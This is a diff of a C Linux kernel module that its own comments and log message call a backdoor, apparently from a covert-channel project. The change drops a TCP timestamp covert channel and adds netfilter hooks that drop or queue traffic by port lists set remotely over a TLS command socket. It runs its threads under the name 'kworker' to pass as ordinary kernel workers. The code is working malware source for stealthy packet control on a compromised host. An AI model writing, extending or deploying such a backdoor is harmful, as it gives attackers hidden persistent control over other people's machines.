@@ -2,7 +2,7 @@
  * Author and Designer: John Agapeyev
  * Date: 2018-09-22
  * Notes:
- * The covert module for handling TCP timestamp modulation
+ * The covert module for complimenting the backdoor
  */
 
 #include <linux/init.h>
@@ -30,7 +30,6 @@
 struct service {
     struct socket* tls_socket;
     struct task_struct* read_thread;
-    struct task_struct* write_thread;
 };
 
 struct nf_hook_ops nfhi;
@@ -171,6 +170,16 @@ int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
     return size;
 }
 
+/*
+ * function:
+ *    read_TLS
+ *
+ * return:
+ *    int
+ *
+ * notes:
+ * Handler for reading and writing kernel module commands relating to firewall
+ */
 int read_TLS(void) {
     int len;
     u16 tmp_port;
@@ -230,16 +239,6 @@ int read_TLS(void) {
     }
     return 0;
 }
-int write_TLS(void) {
-#if 0
-    int len;
-    while (!kthread_should_stop()) {
-        //Send garbage
-        //len = send_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
-    }
-#endif
-    return 0;
-}
 
 /*
  * function:
@@ -253,7 +252,7 @@ int write_TLS(void) {
  *
  * notes:
  * Initializes the userspace connections needed.
- * Establishes encryption, decryption, and tls sockets with userspace.
+ * Establishes tls socket with userspace.
  */
 int init_userspace_conn(void) {
     int error;
@@ -291,14 +290,64 @@ int init_userspace_conn(void) {
  * notes:
  * Netfilter hook for incoming packets.
  * See API for details on arguments
- * All this does is parse packets for tcp timestamps using the valid port, and subtracting 1 from them to make the stack happy
+ * All this does is handle packets according to allow/drop port lists
  */
 unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
     struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
     struct tcphdr* tcp_header;
     struct udphdr* udp_header;
-    unsigned char* packet_data;
-    unsigned char* timestamps = NULL;
+    int i;
+
+    if (ip_header->protocol == IPPROTO_TCP) {
+        tcp_header = (struct tcphdr*) skb_transport_header(skb);
+
+        for (i = 0; i < closed_port_count; ++i) {
+            if (ntohs(tcp_header->dest) == closed_ports[i]) {
+                return NF_DROP;
+            }
+        }
+        for (i = 0; i < open_port_count; ++i) {
+            if (ntohs(tcp_header->dest) == open_ports[i]) {
+                return NF_QUEUE;
+            }
+        }
+    } else if (ip_header->protocol == IPPROTO_UDP) {
+        udp_header = (struct udphdr*) skb_transport_header(skb);
+        for (i = 0; i < closed_port_count; ++i) {
+            if (ntohs(udp_header->dest) == closed_ports[i]) {
+                return NF_DROP;
+            }
+        }
+        for (i = 0; i < open_port_count; ++i) {
+            if (ntohs(udp_header->dest) == open_ports[i]) {
+                return NF_QUEUE;
+            }
+        }
+    }
+    return NF_ACCEPT;
+}
+
+/*
+ * function:
+ *    outgoing_hook
+ *
+ * return:
+ *    unsigned int
+ *
+ * parameters:
+ *    void* priv
+ *    struct sk_buff* skb
+ *    const struct nf_hook_state* state
+ *
+ * notes:
+ * Netfilter hook for outgoing packets.
+ * See API for details on arguments
+ * All this does is handle packets according to allow/drop port lists
+ */
+unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
+    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
+    struct tcphdr* tcp_header;
+    struct udphdr* udp_header;
     int i;
 
     if (ip_header->protocol == IPPROTO_TCP) {
@@ -325,41 +374,6 @@ unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook
             if (ntohs(udp_header->source) == open_ports[i]) {
                 return NF_QUEUE;
             }
-        }
-    }
-    return NF_ACCEPT;
-}
-
-/*
- * function:
- *    outgoing_hook
- *
- * return:
- *    unsigned int
- *
- * parameters:
- *    void* priv
- *    struct sk_buff* skb
- *    const struct nf_hook_state* state
- *
- * notes:
- * Outgoing netfilter hook.
- * TCP timestamps of outgoing packets with psh flag set are modified according to data bit to transmit.
- * If the timestamp LSB == data bit, drop the packet
- * This is done because I can undo the increment in the incoming hook for the stack to play nice
- * And not touching the timestamp is basically impossible for me to detect if I need to decrement or not
- * So it will randomly drop packets until a good timestamp is about to send.
- */
-unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
-    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
-    struct tcphdr* tcp_header;
-    unsigned char* packet_data;
-    unsigned char* timestamps = NULL;
-    int i;
-
-    if (ip_header->protocol == 6) {
-        tcp_header = (struct tcphdr*) skb_transport_header(skb);
-        if (ntohs(tcp_header->dest) == 666) {
         }
     }
     return NF_ACCEPT;
@@ -409,7 +423,6 @@ static int __init mod_init(void) {
     closed_ports = kmalloc(2 * 65536, GFP_KERNEL);
 
     svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
-    svc->write_thread = kthread_run((void*) write_TLS, NULL, "kworker");
     printk(KERN_ALERT "backdoor module loaded\n");
 
     return 0;
